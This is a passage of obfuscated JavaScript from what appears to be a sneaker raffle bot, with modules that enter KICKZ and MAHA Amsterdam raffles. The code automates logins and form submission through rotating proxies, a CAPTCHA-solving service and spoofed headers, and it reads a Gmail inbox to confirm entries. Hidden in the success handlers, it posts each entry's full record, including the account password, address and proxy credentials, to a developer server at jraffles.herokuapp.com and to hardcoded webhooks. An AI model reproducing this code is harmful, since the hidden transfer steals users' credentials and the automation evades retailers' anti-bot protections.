                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0xd96b93['name'] + ']\x20Task\x20' + (_0x128b19 + 0x1) + '\x20:\x20Retrying\x20(' + _0x41a2c5 + '\x20/\x205)')), _0x128b19 = _0x128b19 - 0x1, _0x41a2c5 = _0x41a2c5 + 0x1;
                                continue;
                            }
                            _0xdb2d8c == 'yes' && _0x41a2c5 >= 0x5 && (_0x4d12b6(_0x3d5b6a[_0x128b19], _0xd96b93), _0xdb2d8c = 'no', _0x41a2c5 = 0x0), console['log']('Waiting\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x1a2d5c, _0x55283d, _0x282af6) {
                    _0x275ae5['use'](_0x149eeb()), _0x275ae5['use'](_0x5dbd94({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x165c4b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xb7101a = 0x0; _0xb7101a < _0x55283d['length']; _0xb7101a++) {
                        var _0x5ae198;
                        if (_0x191dbb != 'yes')
                            var _0x191dbb = '', _0x3b3ae3 = 0x0;
                        _0x424e52(_0x1a2d5c['name'] + '\x20Task\x20' + (_0xb7101a + 0x1) + '\x20/\x20' + _0x55283d['length'] + '\x20||\x20File:\x20' + _0x5ce28a + '\x20Proxies:\x20' + _0x268393);
                        var _0x216cbc = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5f9620
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x55283d[_0xb7101a]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x55283d[_0xb7101a]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x165c4b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x57c4cf
                                }
                            ]
                        }];
                        let _0x53f8f8 = [
                            'Email',
                            'Password',
                            'FirstName',
                            'LastName',
                            'Size',
                            'Address1',
                            'HouseNumber',
                            'Zip',
                            'Country',
                            'City'
                        ], _0x17a033 = ![];
                        for (key of _0x53f8f8) {
                            if (_0x55283d[_0xb7101a][key] == '' || !_0x55283d[_0xb7101a][key]) {
                                console['log'](_0x5b438b() + '\x20[' + _0x1a2d5c['name'] + ']\x20Task\x20' + (_0xb7101a + 0x1) + '\x20:\x20Invalid\x20CSV,\x20' + key + '\x20not\x20found'), _0x17a033 = !![];
                                break;
                            }
                        }
                        if (_0x17a033) {
                            await _0x415e3e(0x1f4);
                            continue;
                        }
                        var _0x586d54 = await _0x105954(_0x55283d[_0xb7101a], _0x1a2d5c, 'dev', ![]), _0x93cf8c = await _0x105954(_0x55283d[_0xb7101a], _0x1a2d5c, 'pub', ![]);
                        const _0x2d92f9 = {
                            'succesDEVMSG': { 'embeds': [_0x586d54] },
                            'succesPUBMSG': { 'embeds': [_0x93cf8c] }
                        };
                        try {
                            await _0x3da21c(_0x55283d, _0xb7101a);
                        } catch {
                            _0x191dbb = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x165c4b['useRandomProxy'] = ![])
                            var _0x536b45 = _0x282af6[_0xb7101a]['split'](':');
                        else
                            var _0x5e7e12 = Math['round'](Math['random']() * (_0x282af6['length'] - 0x1)), _0x536b45 = _0x282af6[_0x5e7e12]['split'](':');
                        var _0x5afe53;
                        try {
                            _0x5afe53 = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x536b45[0x0] + ':' + _0x536b45[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5afe53 = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x536b45[0x0] + ':' + _0x536b45[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x106e65 = await _0x5afe53['newPage']();
                            await _0x106e65['authenticate']({
                                'username': '' + _0x536b45[0x2],
                                'password': '' + _0x536b45[0x3]
                            }), console['log'](_0x5b438b() + '\x20[' + _0x1a2d5c['name'] + ']\x20Task\x20' + (_0xb7101a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x106e65['setRequestInterception'](!![]), _0x106e65['on']('request', _0xd3703d => {
                                _0xd3703d['resourceType']() === 'image' || _0xd3703d['resourceType']() === 'font' || _0xd3703d['resourceType']() === 'media' ? _0xd3703d['abort']() : _0xd3703d['continue']();
                            }), await _0x106e65['goto']('' + _0x55283d[_0xb7101a]['Url']['replace']('\x20', ''), { 'waitUntil': 'networkidle2' }), await _0x415e3e(0x12c), await _0x106e65['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x106e65['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x415e3e(0x7d0);
                            try {
                                await _0x106e65['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x106e65['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x5b438b() + '\x20[' + _0x1a2d5c['name'] + ']\x20Task\x20' + (_0xb7101a + 0x1) + '\x20:\x20Logging\x20in'), await _0x106e65['waitForSelector']('#username'), await _0x106e65['type']('#username', _0x55283d[_0xb7101a]['Email']), await _0x106e65['waitForSelector']('#password'), await _0x106e65['type']('#password', _0x55283d[_0xb7101a]['Password']), await _0x415e3e(0x190), await _0x106e65['click']('#buttonSubmit'), await _0x106e65['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x5b438b() + '\x20[' + _0x1a2d5c['name'] + ']\x20Task\x20' + (_0xb7101a + 0x1) + '\x20:\x20Getting\x20Product'), await _0x415e3e(0x1f4), console['log'](_0x5b438b() + '\x20[' + _0x1a2d5c['name'] + ']\x20Task\x20' + (_0xb7101a + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x55283d[_0xb7101a]['Size']);
                            let _0x133bf7 = _0x55283d[_0xb7101a]['Size']['replace']('.5', '\x201/2');
                            if (_0x133bf7['toUpperCase']() == 'RANDOM') {
                                const _0x4ce15e = await _0x106e65['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x9910a7 = Math['round'](Math['random']() * (_0x4ce15e['length'] - 0x1));
                                await _0x4ce15e[_0x9910a7]['click']();
                            } else
                                await _0x106e65['click']('button[aria-label=\x22' + _0x133bf7 + '\x22]');
                            await _0x415e3e(0x1f4);
                            try {
                                await _0x106e65['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x415e3e(0x12c), console['log'](_0x5b438b() + '\x20[' + _0x1a2d5c['name'] + ']\x20Task\x20' + (_0xb7101a + 0x1) + '\x20:\x20Filling\x20Information'), await _0x106e65['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x415e3e(0x12c), await _0x106e65['type']('#dwfrm_raffle_addressFields_firstName', _0x55283d[_0xb7101a]['FirstName']), await _0x415e3e(0x12c), await _0x106e65['type']('#dwfrm_raffle_addressFields_lastName', _0x55283d[_0xb7101a]['LastName']), await _0x415e3e(0x12c), await _0x106e65['select']('#dwfrm_raffle_addressFields_country', _0x55283d[_0xb7101a]['Country']), await _0x415e3e(0x12c), await _0x106e65['type']('#dwfrm_raffle_addressFields_city', _0x55283d[_0xb7101a]['City']), await _0x415e3e(0x12c);
                            _0x55283d[_0xb7101a]['Postcode'] == undefined && (_0x55283d[_0xb7101a]['Postcode'] = _0x55283d[_0xb7101a]['Zip']);
                            await _0x106e65['type']('#dwfrm_raffle_addressFields_postalCode', _0x55283d[_0xb7101a]['Postcode']), await _0x415e3e(0x12c), await _0x106e65['type']('#dwfrm_raffle_addressFields_address1', _0x55283d[_0xb7101a]['Address1']), await _0x415e3e(0x12c), await _0x106e65['type']('#dwfrm_raffle_addressFields_address2', _0x55283d[_0xb7101a]['HouseNumber']), await _0x415e3e(0x12c), await _0x106e65['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x55283d[_0xb7101a]['Address2']), await _0x415e3e(0x12c), await _0x106e65['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x415e3e(0x12c), await _0x106e65['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x55283d[_0xb7101a]['Follower']), await _0x415e3e(0x1f4), await _0x106e65['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x415e3e(0x1f4), console['log'](_0x5b438b() + '\x20[' + _0x1a2d5c['name'] + ']\x20Task\x20' + (_0xb7101a + 0x1) + '\x20:\x20' + _0x5dc29b['blue']('Awaiting\x20Paypal\x20Payment')), await _0x106e65['click']('.b-paypal_button');
                            try {
                                await _0x106e65['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x191dbb = 'no', _0x53db49(_0x55283d[_0xb7101a], _0x1a2d5c), console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x1a2d5c['name'] + ']\x20Task\x20' + (_0xb7101a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x2d92f9['succesDEVMSG']);
                                await _0x415e3e(0xc8), await _0x4d8e61(_0xbd9f1e, _0x2d92f9['succesDEVMSG']), await _0x415e3e(0xc8), await _0x4d8e61(_0x3ba9f8, _0x2d92f9['succesPUBMSG']);
                                let _0x5d37ee = _0x55283d[_0xb7101a];
                                try {
                                    prxdata = {
                                        'username': _0x5f9620['replace']('#', ''),
                                        'module': _0x1a2d5c['name'],
                                        'entrydata': JSON['stringify'](_0x5d37ee),
                                        'proxy': '' + _0x282af6[_0xb7101a]
                                    };
                                    var _0x41c440 = JSON['stringify'](prxdata);
                                    let _0x4850b5 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x328de3['post']('https://jraffles.herokuapp.com/success', _0x41c440, _0x4850b5);
                                } catch (_0x554dcf) {
                                }
                            } catch (_0x51f93a) {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x1a2d5c['name'] + ']\x20Task\x20' + (_0xb7101a + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x51f93a)), _0x5ae198 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x51f93a;
                                var _0x5e1fb2 = await _0x105954(_0x55283d[_0xb7101a], _0x1a2d5c, 'dev', !![], _0x5ae198);
                                _0x2d92f9['errorDEV'] = { 'embeds': [_0x5e1fb2] }, _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x2d92f9['errorDEV']), await _0x4d8e61(_0x369064, _0x2d92f9['errorDEV']);
                            }
                        } catch (_0xa6632a) {
                            console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x1a2d5c['name'] + ']\x20Task\x20' + (_0xb7101a + 0x1) + '\x20:\x20' + _0xa6632a)), _0x5ae198 = '' + _0xa6632a;
                            var _0x5e1fb2 = await _0x105954(_0x55283d[_0xb7101a], _0x1a2d5c, 'dev', !![], _0x5ae198);
                            _0x2d92f9['errorDEV'] = { 'embeds': [_0x5e1fb2] }, _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x2d92f9['errorDEV']), await _0x4d8e61(_0x369064, _0x2d92f9['errorDEV']), _0x191dbb = 'yes';
                        } finally {
                            _0x5afe53 && _0x5afe53['close']();
                            if (_0x191dbb == 'yes' && _0x3b3ae3 != 0x5) {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x1a2d5c['name'] + ']\x20Task\x20' + (_0xb7101a + 0x1) + '\x20:\x20Retrying\x20(' + _0x3b3ae3 + '\x20/\x205)')), _0xb7101a = _0xb7101a - 0x1, _0x3b3ae3 = _0x3b3ae3 + 0x1;
                                continue;
                            }
                            _0x191dbb == 'yes' && _0x3b3ae3 >= 0x5 && (_0x4d12b6(_0x55283d[_0xb7101a], _0x1a2d5c), _0x191dbb = 'no', _0x3b3ae3 = 0x0), console['log']('Waiting\x20for\x20' + _0x165c4b['AfewDelay'] + '\x20ms'), await _0x415e3e(_0x165c4b['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x53b52b, _0x2733c7, _0x44ee70) {
                    for (var _0x44248f = 0x0; _0x44248f < _0x2733c7['length']; _0x44248f++) {
                        try {
                            await _0x3da21c(_0x2733c7, _0x44248f);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x281039(_0x3b9813, _0x53bdee, _0x1b11da, _0x26a114, _0x5c2289) {
                            var _0x1fcd3a, _0x568ba6 = {}, _0x30877e = [], _0x5f1b9b = {}, _0x4dc711 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0xb848b5 = Math['round'](Math['random']() * (_0x4dc711['length'] - 0x1));
                            !_0x26a114 && (_0x26a114 = {});
                            if (_0x53bdee != 'ver') {
                                _0x424e52(_0x1b11da['name'] + '\x20Task\x20' + (_0x3b9813 + 0x1) + '\x20/\x20' + _0x26a114['length'] + '\x20||\x20File:\x20' + _0x5ce28a + '\x20Proxies:\x20' + _0x268393), await _0x3da21c(_0x26a114, _0x3b9813), _0x568ba6 = _0x1b11da['data'], _0x568ba6['data']['attributes']['email'] = '' + _0x26a114[_0x3b9813]['Email'];
                                if (_0x26a114[_0x3b9813]['Size'] == 'RANDOM') {
                                }
                                _0x568ba6['data']['attributes']['properties']['$first_name'] = '' + _0x26a114[_0x3b9813]['FirstName'], _0x568ba6['data']['attributes']['properties']['$last_name'] = '' + _0x26a114[_0x3b9813]['LastName'], _0x568ba6['data']['attributes']['properties']['$address1'] = _0x26a114[_0x3b9813]['Address1'] + '\x20' + _0x26a114[_0x3b9813]['Address2'] + '\x20' + _0x26a114[_0x3b9813]['HouseNumber'], _0x568ba6['data']['attributes']['properties']['$zip'] = '' + _0x26a114[_0x3b9813]['Zip'], _0x568ba6['data']['attributes']['properties']['$city'] = '' + _0x26a114[_0x3b9813]['City'], _0x568ba6['data']['attributes']['properties']['$country'] = '' + _0x26a114[_0x3b9813]['Country'], _0x26a114[_0x3b9813]['Size'] == 'RANDOM' ? _0x568ba6['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x4dc711[_0xb848b5] : _0x568ba6['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x26a114[_0x3b9813]['Size'], _0x568ba6['data']['attributes']['properties']['$phone_number'] = '' + _0x26a114[_0x3b9813]['Phone'], _0x568ba6['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x26a114[_0x3b9813]['Follower'];
                            }
                            if (_0x165c4b['useRandomProxy'] = ![])
                                var _0x490c78 = _0x5c2289[_0x3b9813]['split'](':');
                            else
                                var _0x4b28a4 = Math['round'](Math['random']() * (_0x5c2289['length'] - 0x1)), _0x490c78 = _0x5c2289[_0x4b28a4]['split'](':');
                            var _0x4cfb86 = {
                                'jar': _0x15ef28,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x1b11da['url'],
                                'headers': _0x1b11da['headers'],
                                'body': JSON['stringify'](_0x568ba6),
                                'proxy': 'http://' + _0x490c78[0x2] + ':' + _0x490c78[0x3] + '@' + _0x490c78[0x0] + ':' + _0x490c78[0x1]
                            };
                            return _0x53bdee != 'ver' && (_0x4cfb86['url'] = _0x1b11da['url'], _0x4cfb86['headers'] = _0x1b11da['headers']), _0x53bdee == 'ver' && (_0x4cfb86['method'] = 'GET'), new Promise(function (_0x213104, _0x27ac93) {
                                callback = async (_0x29145a, _0x14975d, _0x20f4f4) => {
                                    if (!_0x29145a && _0x14975d['statusCode'] == 0xca || !_0x29145a && _0x14975d['statusCode'] == 0xc8) {
                                        if (_0x53bdee != 'ver') {
                                            var _0x15a9ef = await _0x105954(_0x26a114[_0x3b9813], _0x1b11da, 'dev', ![]), _0x48add5 = await _0x105954(_0x26a114[_0x3b9813], _0x1b11da, 'pub', ![]);
                                            const _0x9d5964 = {
                                                'succesDEVMSG': { 'embeds': [_0x15a9ef] },
                                                'succesPUBMSG': { 'embeds': [_0x48add5] }
                                            };
                                            let _0x48abd9 = _0x26a114[_0x3b9813];
                                            try {
                                                prxdata = {
                                                    'username': _0x5f9620['replace']('#', ''),
                                                    'module': _0x1b11da['name'],
                                                    'entrydata': JSON['stringify'](_0x48abd9),
                                                    'proxy': '' + _0x5c2289[_0x3b9813]
                                                };
                                                var _0x5c3a51 = JSON['stringify'](prxdata);
                                                let _0x3898aa = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x328de3['post']('https://jraffles.herokuapp.com/success', _0x5c3a51, _0x3898aa);
                                            } catch (_0x15382a) {
                                            }
                                            if (_0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '')
                                                try {
                                                    await _0x4d8e61(_0x165c4b['webhook'], _0x9d5964['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x415e3e(0xc8), await _0x4d8e61(_0xbd9f1e, _0x9d5964['succesDEVMSG']), await _0x415e3e(0xc8);
                                            try {
                                                await _0x4d8e61(_0x3ba9f8, _0x9d5964['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x53db49(_0x26a114[_0x3b9813], _0x1b11da);
                                        }
                                        _0x213104(console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x1b11da['name'] + ']\x20Task\x20' + (_0x3b9813 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x53bdee != 'ver') {
                                            var _0x430a9b = '' + _0x29145a, _0x22c992 = await _0x105954(_0x26a114[_0x3b9813], _0x1b11da, 'dev', !![], _0x430a9b), _0x364f82 = {};
                                            _0x364f82['errorDEV'] = { 'embeds': [_0x22c992] }, _0x4d12b6(_0x26a114[_0x3b9813], _0x1b11da), _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x364f82['errorDEV']), await _0x4d8e61(_0x369064, _0x364f82['errorDEV']);
                                        }
                                        _0x27ac93(console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x1b11da['name'] + ']\x20Task\x20' + (_0x3b9813 + 0x1) + ':\x20' + _0x29145a)));
                                    }
                                };
                                try {
                                    _0x53bdee != 'ver' && console['log'](_0x5b438b() + '\x20[' + _0x1b11da['name'] + ']\x20Task\x20' + (_0x3b9813 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x568ba6['data']['attributes']['email']), _0x417264(_0x4cfb86, callback);
                                } catch (_0x1155ca) {
                                    console['log'](_0x5b438b() + '\x20Task\x20' + (_0x3b9813 + 0x1) + ':\x20' + _0x1155ca);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x281039(_0x44248f, 'nor', _0x53b52b, _0x2733c7, _0x44ee70), console['log'](_0x5b438b() + '\x20[' + _0x53b52b['name'] + ']\x20Sleeping\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay']);
                        } catch (_0x5817ac) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x361abe, _0xb521c2, _0x2b6132) {
                    var _0x44131f = [], _0x2ecfb3 = ![];
                    async function _0x3971e9() {
                        var _0x309981 = new _0x569e4e({
                            'user': _0x165c4b['masterMail'],
                            'password': _0x165c4b['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x14ba81(_0x5531ef) {
                            _0x309981['openBox']('INBOX', ![], _0x5531ef);
                        }
                        _0x309981['once']('ready', function () {
                            _0x14ba81(function (_0x5f11c7, _0x2d765f) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x5f11c7)
                                    throw _0x5f11c7;
                                _0x309981['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x1f3366, _0x299c69) {
                                    if (!_0x299c69 || !_0x299c69['length'])
                                        console['log'](_0x5b438b() + '\x20[' + _0x361abe['name'] + ']\x20No\x20mails\x20found'), _0x309981['end']();
                                    else {
                                        var _0x5bd2ef = _0x309981['seq']['fetch'](_0x299c69, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x5bd2ef['on']('message', function (_0xc44180, _0x50aa5f) {
                                            var _0x5a9932 = '(#' + _0x50aa5f + ')\x20';
                                            _0xc44180['on']('body', function (_0x2d94a2, _0xb8b508) {
                                                _0x2736cb(_0x2d94a2, (_0xd6b2bc, _0x3cce5d) => {
                                                    var _0x246239 = _0x3cce5d['text']['split']('(')[0x1], _0x3be131 = _0x246239['split'](')')[0x0];
                                                    _0x44131f['push'](_0x3be131);
                                                });
                                            }), _0xc44180['once']('end', function () {
                                            });
                                        }), _0x5bd2ef['once']('error', function (_0x1b7407) {
                                            console['log']('Fetch\x20error:\x20' + _0x1b7407), _0x2ecfb3 = !![];
                                        }), _0x5bd2ef['once']('end', function () {
                                            _0x309981['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x309981['once']('error', function (_0x303f62) {
                            console['log'](_0x5dc29b['red'](_0x303f62['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x2ecfb3 = !![];
                        }), _0x309981['once']('end', async function () {
                            _0x2ecfb3 = !![];
                        }), _0x309981['connect']();
                    }
                    async function _0x10a664(_0xd6f792, _0x32cf41, _0x30514c) {
                        for (var _0x3dfee5 = 0x0; _0x3dfee5 < _0x32cf41['length']; _0x3dfee5++) {
                            async function _0x767f10(_0x3163a7, _0x2f002c, _0x3b7f9f, _0x2ef0fe, _0x5836eb) {
                                var _0xb29e0e, _0x3222db = {}, _0x59b769 = [], _0xff92e6 = {}, _0x59934c = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x3a40f8 = Math['round'](Math['random']() * (_0x59934c['length'] - 0x1));
                                _0x2ef0fe[_0x3163a7]['Size'] == 'RANDOM' && (_0x2ef0fe[_0x3163a7]['Size'] = _0x59934c[_0x3a40f8]);
                                !_0x2ef0fe && (_0x2ef0fe = {});
                                if (_0x165c4b['useRandomProxy'] = ![])
                                    var _0x48532f = _0x5836eb[_0x3163a7]['split'](':');
                                else
                                    var _0x92d8b = Math['round'](Math['random']() * (_0x5836eb['length'] - 0x1)), _0x48532f = _0x5836eb[_0x92d8b]['split'](':');
                                var _0x243ced = {
                                    'jar': _0x15ef28,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x3b7f9f['url'],
                                    'headers': _0x3b7f9f['headers'],
                                    'body': JSON['stringify'](_0x3222db),
                                    'proxy': 'http://' + _0x48532f[0x2] + ':' + _0x48532f[0x3] + '@' + _0x48532f[0x0] + ':' + _0x48532f[0x1]
                                };
                                return _0x2f002c != 'ver' && (_0x243ced['url'] = _0x3b7f9f['url'], _0x243ced['headers'] = _0x3b7f9f['headers']), _0x2f002c == 'ver' && (_0x243ced['method'] = 'GET', _0x243ced['url'] = _0x2ef0fe[_0x3163a7]), new Promise(function (_0x1c93cb, _0x1ee6e1) {
                                    callback = async (_0x3ea72d, _0x46c79f, _0x6371e5) => {
                                        if (!_0x3ea72d && _0x46c79f['statusCode'] == 0xca || !_0x3ea72d && _0x46c79f['statusCode'] == 0xc8) {
                                            if (_0x2f002c != 'ver') {
                                                var _0x344684 = await _0x105954(_0x2ef0fe[_0x3163a7], _0x3b7f9f, 'dev', ![]), _0x6851d5 = await _0x105954(_0x2ef0fe[_0x3163a7], _0x3b7f9f, 'pub', ![]);
                                                const _0x116e72 = {
                                                    'succesDEVMSG': { 'embeds': [_0x344684] },
                                                    'succesPUBMSG': { 'embeds': [_0x6851d5] }
                                                };
                                                if (_0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '')
                                                    try {
                                                        await _0x4d8e61(_0x165c4b['webhook'], _0x116e72['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x415e3e(0xc8), await _0x4d8e61(_0xbd9f1e, _0x116e72['succesDEVMSG']), await _0x415e3e(0xc8);
                                                try {
                                                    await _0x4d8e61(_0x3ba9f8, _0x116e72['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x53db49(_0x2ef0fe[_0x3163a7], _0x3b7f9f);
                                            }
                                            _0x1c93cb(console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x3b7f9f['name'] + ']\x20Task\x20' + (_0x3163a7 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x2f002c != 'ver') {
